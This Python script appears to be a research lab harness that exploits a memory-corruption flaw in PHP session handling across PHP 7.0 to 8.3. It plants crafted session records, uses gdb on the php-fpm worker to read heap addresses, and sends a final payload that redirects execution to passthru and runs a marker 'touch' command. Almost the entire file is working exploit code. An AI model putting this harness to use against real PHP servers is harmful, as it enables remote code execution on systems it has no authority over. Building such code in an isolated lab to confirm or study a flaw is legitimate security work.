#!/usr/bin/env python3
"""Per-version live lab: plant -> calibrate -> reset -> plant -> final trigger.

Every instance is private: own port, docroot, sessions, logs, ASLR off via
setarch -R.  Only the pool master/worker of labs/<version> are touched.
"""
import json, os, re, shutil, signal, subprocess, sys, time

R = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
VERS = ['7.0.33', '7.1.33', '7.2.34', '7.3.33', '8.0.30', '8.2.35', '8.3.36']


def labdir(v):
    return os.path.join(R, 'labs', v)


def info(v):
    return json.load(open(os.path.join(labdir(v), 'lab.json')))


def rd(p):
    try:
        return int(open(p).read().strip())
    except Exception:
        return None


def alive(pid):
    try:
        os.kill(pid, 0)
        return True
    except Exception:
        return False


def port_pids(port):
    out = subprocess.run(['ss', '-lntp'], capture_output=True, text=True).stdout
    pids = set()
    for line in out.splitlines():
        if ':%d ' % port in line:
            pids.update(int(x) for x in re.findall(r'pid=(\d+)', line))
    return pids


def stop(v):
    lab = labdir(v)
    cand = set()
    m = rd(os.path.join(lab, 'run', 'master.pid'))
    if m:
        cand.add(m)
    cand |= port_pids(info(v)['port'])
    for pid in cand:
        if alive(pid):
            try:
                os.kill(pid, signal.SIGTERM)
            except Exception:
                pass
    t0 = time.time()
    while time.time() - t0 < 5 and any(alive(p) for p in cand):
        time.sleep(0.05)
    for pid in cand:
        if alive(pid):
            try:
                os.kill(pid, signal.SIGKILL)
            except Exception:
                pass
    time.sleep(0.2)


def start(v):
    lab = labdir(v)
    for f in ('run/child.pid', 'run/master.pid', 'run/php-fpm.pid'):
        try:
            os.unlink(os.path.join(lab, f))
        except FileNotFoundError:
            pass
    out = subprocess.run([os.path.join(lab, 'start.sh')], capture_output=True, text=True)
    txt = out.stdout + out.stderr
    open(os.path.join(lab, 'phase', 'start.txt'), 'w').write(txt)
    m = re.search(r'master=(\d+) child=(\d+)', txt)
    if not m:
        raise SystemExit('start failed: ' + txt)
    return int(m.group(1)), int(m.group(2))


def drv(v, *args, env=None):
    lab = labdir(v)
    e = dict(os.environ)
    e['LAB'] = lab
    e['PORT'] = str(info(v)['port'])
    if env:
        e.update(env)
    out = subprocess.run([sys.executable, os.path.join(lab, 'scripts', 'drv.py')] + list(args),
                         capture_output=True, text=True, env=e, timeout=120)
    if out.returncode != 0:
        raise SystemExit('drv %s failed: %s %s' % (args, out.stdout[-800:], out.stderr[-800:]))
    return out.stdout


def gdb(v, script, action=None, phase=None, timeout=60):
    lab = labdir(v)
    child = rd(os.path.join(lab, 'run', 'child.pid'))
    path = os.path.join(lab, 'phase', phase or (os.path.basename(script) + '.txt'))
    fp = open(path, 'w')
    p = subprocess.Popen(['gdb', '-q', '-batch', '-p', str(child), '-x',
                          os.path.join(lab, 'gdb', script)],
                         stdout=fp, stderr=subprocess.STDOUT, text=True)
    t0 = time.time()
    while time.time() - t0 < 20:
        try:
            st = open('/proc/%d/status' % child).read()
            if re.search(r'TracerPid:\s+%d' % p.pid, st):
                break
        except FileNotFoundError:
            break
        if p.poll() is not None:
            break
        time.sleep(0.05)
    time.sleep(0.35)
    res = None
    if action:
        res = action()
    try:
        p.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        p.kill()
        p.wait()
    fp.close()
    return open(path).read(), res


def kv(txt, key):
    m = re.search(r'^%s=(.*)$' % re.escape(key), txt, re.M)
    return m.group(1) if m else None


def main():
    v = sys.argv[1]
    step = sys.argv[2] if len(sys.argv) > 2 else 'run'
    s = info(v)
    lab = labdir(v)
    for d in ('phase', 'req', 'run', 'log', 'sessions'):
        os.makedirs(os.path.join(lab, d), exist_ok=True)
    if step == 'start':
        print(start(v))
        return
    if step == 'stop':
        m = rd(os.path.join(lab, 'run', 'master.pid'))
        if m:
            os.kill(m, signal.SIGTERM)
        return
    if step != 'run':
        raise SystemExit('usage: lab.py <version> [start|stop|run]')

    rec = {'version': v, 'port': s['port'], 'binary': s['bin'], 'md5': s['md5'],
           'A': s['A'], 'zif_system': s['zif_system'],
           'zif_passthru': s['zif_passthru'], 'steps': []}
    for f in ('PASSTHRU_' + v.replace('.', ''),):
        try:
            os.unlink(os.path.join(lab, f))
        except FileNotFoundError:
            pass
    for f in os.listdir(os.path.join(lab, 'sessions')):
        os.unlink(os.path.join(lab, 'sessions', f))

    def note(k, val):
        rec[k] = val
        rec['steps'].append(k)
        print('%-22s %s' % (k, val), flush=True)

    stop(v)
    time.sleep(0.3)
    master, child = start(v)
    note('master_start', master)
    note('worker_start', child)
    st = drv(v, 'probe')
    pid = int(re.search(r'PID=(\d+)', st).group(1))
    note('probe_pid', pid)
    assert pid == child, (pid, child)

    payload = s['plant_payload']
    out = drv(v, 'plant', env={'PLANT_PAYLOAD': payload})
    note('plant1_stdout', out.replace('\n', ' ')[:300])
    calib_payload = payload
    if 'AFTER type' in out and 'stop' not in out:
        raise SystemExit('plant did not bail out with %r' % payload)

    txt, _ = gdb(v, 'state.gdb', phase='state_after_plant1.txt')
    note('state1', {k: kv(txt, k) for k in ('BG_LEVEL', 'BG_DATA', 'P_LAST_DTOR',
                                            'P_FIRST_DTOR', 'DTOR_USED')})
    P = int(kv(txt, 'BG_DATA'), 16)
    B0 = int(kv(txt, 'P_LAST_DTOR'), 16)
    assert int(kv(txt, 'BG_LEVEL')) == 1 and P and B0

    # calibration 1: zero payload, measures X1
    sid1 = 'k1' + v.replace('.', '')
    m = build(v, sid1, dict(mode='calib', zero=True,
                            target=int(s['zif_passthru'], 16)))
    note('calib1_record', {k: m[k] for k in ('total', 'rec1_len', 'L', 'payload_start')})
    txt, _ = gdb(v, 'calib.gdb', lambda: drv(v, 'calib', sid1), phase='calib1_gdb.txt')
    hits = re.findall(r'DECODE hit=(\d+) data=(\S+) val=(\S+) len=(\d+) level=(-?\d+)',
                      txt)
    note('calib1_hits', [(int(a), b, c, int(d), int(e)) for a, b, c, d, e in hits])
    X1 = int([h for h in hits if h[0] == '1'][0][2], 16) - 0x18
    note('X1', hex(X1))

    # calibration 2: fake P/B0 at the measured X1 with K=0 (no serializer write)
    sid2 = 'k2' + v.replace('.', '')
    m = build(v, sid2, dict(mode='calib', zero=False, x1=X1, p=P, b0=B0,
                            target=int(s['zif_passthru'], 16)))
    note('calib2_record', {k: m[k] for k in ('total', 'rec1_len', 'L', 'payload_start',
                                             'p_off', 'b_off', 'p_idx', 'b_idx', 'K')})
    txt, _ = gdb(v, 'calib.gdb', lambda: drv(v, 'calib', sid2), phase='calib2_gdb.txt')
    hits = re.findall(r'DECODE hit=(\d+) data=(\S+) val=(\S+) len=(\d+) level=(-?\d+)',
                      txt)
    note('calib2_hits', [(int(a), b, c, int(d), int(e)) for a, b, c, d, e in hits])
    if len(hits) < 2:
        raise SystemExit('calib2 did not reach 2 decodes:\n' + txt[-2000:])
    X1b = int(hits[0][2], 16) - 0x18
    X2 = int(hits[1][2], 16) - 0x18
    note('X1b', hex(X1b))
    note('X2', hex(X2))
    if X1b != X1:
        note('X1_MISMATCH', True)
    txt, _ = gdb(v, 'ser.gdb', phase='ser_after_calib2.txt')
    note('ser2_after_calib2', kv(txt, 'PSER2'))

    # reset the worker (master untouched) so the final run starts from level 0
    os.kill(child, signal.SIGKILL)
    newchild = None
    t0 = time.time()
    while time.time() - t0 < 10:
        kids = subprocess.run(['pgrep', '-P', str(master)], capture_output=True, text=True).stdout.split()
        if kids:
            newchild = int(kids[0])
            break
        time.sleep(0.1)
    assert newchild and newchild != child
    note('worker_reset', newchild)
    open(os.path.join(lab, 'run', 'child.pid'), 'w').write(str(newchild))
    time.sleep(0.3)
    st = drv(v, 'probe')
    pid = int(re.search(r'PID=(\d+)', st).group(1))
    note('probe2_pid', pid)
    assert pid == newchild
    out = drv(v, 'plant', env={'PLANT_PAYLOAD': payload})
    note('plant2_stdout', out.replace('\n', ' ')[:300])
    txt, _ = gdb(v, 'state.gdb', phase='state_after_plant2.txt')
    note('state2', {k: kv(txt, k) for k in ('BG_LEVEL', 'BG_DATA', 'P_LAST_DTOR',
                                            'P_FIRST_DTOR', 'DTOR_USED')})
    P2 = int(kv(txt, 'BG_DATA'), 16)
    B02 = int(kv(txt, 'P_LAST_DTOR'), 16)
    assert int(kv(txt, 'BG_LEVEL')) == 1 and P2 and B02
    note('P2', hex(P2))
    note('B02', hex(B02))

    sid3 = 'f' + v.replace('.', '')
    cmd = 'touch ' + s['marker']
    m = build(v, sid3, dict(mode='final', zero=False, x1=X1, x2=X2, p=P2, b0=B02,
                            target=int(s['zif_passthru'], 16),
                            a_target=int(s['A'], 16), cmd=cmd))
    note('final_record', {k: m[k] for k in ('total', 'rec1_len', 'L', 'payload_start',
                                            'p_off', 'b_off', 'K', 'F', 'F_off',
                                            'cmd_off')})
    note('marker_pre_exists', os.path.exists(s['marker']))
    txt, out = gdb(v, 'final.gdb', lambda: drv(v, 'trigger', sid3),
                   phase='final_gdb.txt', timeout=90)
    note('final_gdb', [l for l in txt.splitlines() if re.match(
        r'^(DECODE|ZIF_PASSTHRU|PHP_EXEC|F=|AFTER|STOPPED|Program received)', l)])
    st = drv(v, 'count')
    note('requests', st.strip())
    mk = os.path.exists(s['marker'])
    stt = os.stat(s['marker']) if mk else None
    note('marker', {'exists': mk,
                    'mtime': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(stt.st_mtime)) if mk else None,
                    'mtime_ns': stt.st_mtime_ns if mk else None,
                    'inode': stt.st_ino if mk else None,
                    'size': stt.st_size if mk else None})
    resp_pid = None
    rq = re.findall(r'PID=(\d+)', out or '')
    if rq:
        resp_pid = int(rq[-1])
    note('response_pid', resp_pid)
    note('worker_alive_after', alive(newchild))
    note('same_worker', resp_pid == newchild)
    note('master_alive_after', alive(master))
    note('master_pid_after', master)
    txt, _ = gdb(v, 'ser.gdb', phase='ser_after_trigger.txt')
    note('ser_after_trigger', {k: kv(txt, k) for k in (
        'PSER2', 'PSER3NAME', 'PSER3ENC', 'BG_LEVEL', 'BG_DATA')})
    json.dump(rec, open(os.path.join(lab, 'phase', 'result.json'), 'w'), indent=1)
    print('RESULT', json.dumps({k: rec[k] for k in (
        'version', 'marker', 'worker_alive_after', 'same_worker',
        'master_alive_after', 'ser_after_trigger')}, indent=1))


def build(v, sid, opts):
    s = info(v)
    out = os.path.join(labdir(v), 'sessions', 'sess_' + sid)
    cmd = [sys.executable, os.path.join(labdir(v), 'scripts', 'mkrec.py'),
           '--out', out, '--total', '131014',
           '--key-len', str(s['key_len']),
           '--arg1-off', s['arg1_off'], '--type-off', s['type_off'],
           '--p-size', '72',
           '--target', hex(opts['target'])]
    if s['old_dtor']:
        cmd.append('--old-dtor')
    if opts.get('zero'):
        cmd.append('--zero-payload')
    else:
        cmd += ['--mode', opts['mode'],
                '--x1', hex(opts['x1']), '--p', hex(opts['p']), '--b0', hex(opts['b0'])]
        if opts['mode'] == 'final':
            cmd += ['--x2', hex(opts['x2']), '--cmd', opts['cmd'],
                    '--a-target', hex(opts['a_target'])]
    meta = os.path.join(labdir(v), 'phase',
                        'mkrec_%s.json' % sid)
    cmd += ['--meta', meta]
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        raise SystemExit('mkrec failed: %s\n%s' % (r.stdout[-1500:], r.stderr[-1500:]))
    return json.load(open(meta))


if __name__ == '__main__':
    main()
